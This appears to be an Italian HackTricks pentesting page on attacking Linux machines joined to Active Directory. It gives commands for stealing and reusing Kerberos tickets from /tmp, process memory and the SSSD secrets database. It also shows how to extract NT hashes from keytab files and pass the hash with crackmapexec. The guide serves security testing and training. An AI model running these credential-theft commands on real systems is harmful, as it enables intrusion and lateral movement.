# Active Directory Linux

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata su HackTricks**? O vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al [repo hacktricks](https://github.com/carlospolop/hacktricks) e al [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

Una macchina Linux può essere presente anche all'interno di un ambiente Active Directory.

Una macchina Linux in un AD potrebbe **memorizzare diversi ticket CCACHE all'interno di file. Questi ticket possono essere utilizzati e abusati come qualsiasi altro ticket Kerberos**. Per leggere questi ticket è necessario essere il proprietario dell'utente del ticket o **root** all'interno della macchina.

## Enumerazione

### Enumerazione AD da Linux

Se hai accesso a un AD in Linux (o bash in Windows) puoi provare [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) per enumerare l'AD.

Puoi anche controllare la seguente pagina per imparare **altre modalità per enumerare l'AD da Linux**:

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

### FreeIPA

FreeIPA è un'**alternativa** open-source a Microsoft Windows **Active Directory**, principalmente per ambienti **Unix**. Combina un **directory LDAP completa** con un centro di distribuzione delle chiavi MIT **Kerberos** per la gestione simile ad Active Directory. Utilizzando il sistema di certificati Dogtag **Certificate System** per la gestione dei certificati CA & RA, supporta l'autenticazione **multifattore**, inclusi i smart card. SSSD è integrato per i processi di autenticazione Unix. Scopri di più al riguardo in:

{% content-ref url="../freeipa-pentesting.md" %}
[freeipa-pentesting.md](../freeipa-pentesting.md)
{% endcontent-ref %}

## Giocare con i ticket

### Pass The Ticket

In questa pagina troverai diversi luoghi in cui potresti **trovare ticket Kerberos all'interno di un host Linux**, nella pagina seguente puoi imparare come trasformare questi formati di ticket CCache in Kirbi (il formato necessario per l'uso in Windows) e anche come eseguire un attacco PTT:

{% content-ref url="../../windows-hardening/active-directory-methodology/pass-the-ticket.md" %}
[pass-the-ticket.md](../../windows-hardening/active-directory-methodology/pass-the-ticket.md)
{% endcontent-ref %}

### Riutilizzo del ticket CCACHE da /tmp

I file CCACHE sono formati binari per **memorizzare le credenziali Kerberos** che vengono tipicamente archiviati con autorizzazioni 600 in `/tmp`. Questi file possono essere identificati dal loro **formato di nome, `krb5cc_%{uid}`,** che corrisponde all'UID dell'utente. Per la verifica del ticket di autenticazione, la **variabile d'ambiente `KRB5CCNAME`** dovrebbe essere impostata sul percorso del file di ticket desiderato, consentendone il riutilizzo.

Elencare il ticket corrente utilizzato per l'autenticazione con `env | grep KRB5CCNAME`. Il formato è portatile e il ticket può essere **riutilizzato impostando la variabile d'ambiente** con `export KRB5CCNAME=/tmp/ticket.ccache`. Il formato del nome del ticket Kerberos è `krb5cc_%{uid}`, dove uid è l'UID dell'utente.
```bash
# Find tickets
ls /tmp/ | grep krb5cc
krb5cc_1000

# Prepare to use it
export KRB5CCNAME=/tmp/krb5cc_1000
```
### Riutilizzo del ticket CCACHE dalla keyring

**I ticket Kerberos memorizzati nella memoria di un processo possono essere estratti**, specialmente quando la protezione ptrace della macchina è disabilitata (`/proc/sys/kernel/yama/ptrace_scope`). Uno strumento utile a questo scopo si trova su [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), che facilita l'estrazione iniettando nelle sessioni e scaricando i ticket in `/tmp`.

Per configurare e utilizzare questo strumento, seguire i passaggi di seguito:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Questa procedura cercherà di iniettarsi in varie sessioni, indicando il successo memorizzando i ticket estratti in `/tmp` con una convenzione di denominazione `__krb_UID.ccache`.


### Riutilizzo del ticket CCACHE da SSSD KCM

SSSD mantiene una copia del database nel percorso `/var/lib/sss/secrets/secrets.ldb`. La corrispondente chiave viene memorizzata come file nascosto nel percorso `/var/lib/sss/secrets/.secrets.mkey`. Di default, la chiave è leggibile solo se si hanno i permessi di **root**.

Invocando \*\*`SSSDKCMExtractor` \*\* con i parametri --database e --key, verrà analizzato il database e **decifrati i segreti**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
Il **blob Kerberos della cache delle credenziali può essere convertito in un file CCache Kerberos utilizzabile** che può essere passato a Mimikatz/Rubeus.

### Riutilizzo del ticket CCACHE da keytab
```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```
### Estrarre gli account da /etc/krb5.keytab

Le chiavi degli account di servizio, essenziali per i servizi che operano con privilegi di root, vengono conservate in modo sicuro nei file **`/etc/krb5.keytab`**. Queste chiavi, simili a password per i servizi, richiedono una rigorosa riservatezza.

Per ispezionare il contenuto del file keytab, è possibile utilizzare il comando **`klist`**. Lo strumento è progettato per visualizzare i dettagli delle chiavi, inclusa l'**NT Hash** per l'autenticazione dell'utente, in particolare quando il tipo di chiave viene identificato come 23.
```bash
klist.exe -t -K -e -k FILE:C:/Path/to/your/krb5.keytab
# Output includes service principal details and the NT Hash
```
Per gli utenti Linux, **`KeyTabExtract`** offre la funzionalità di estrarre l'hash RC4 HMAC, che può essere sfruttato per il riutilizzo dell'hash NTLM.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
Su macOS, **`bifrost`** funge da strumento per l'analisi dei file keytab.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Utilizzando le informazioni sull'account e l'hash estratti, è possibile stabilire connessioni ai server utilizzando strumenti come **`crackmapexec`**.
```bash
crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
```
## Riferimenti
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata su HackTricks**? O vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al [repo hacktricks](https://github.com/carlospolop/hacktricks) e al [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
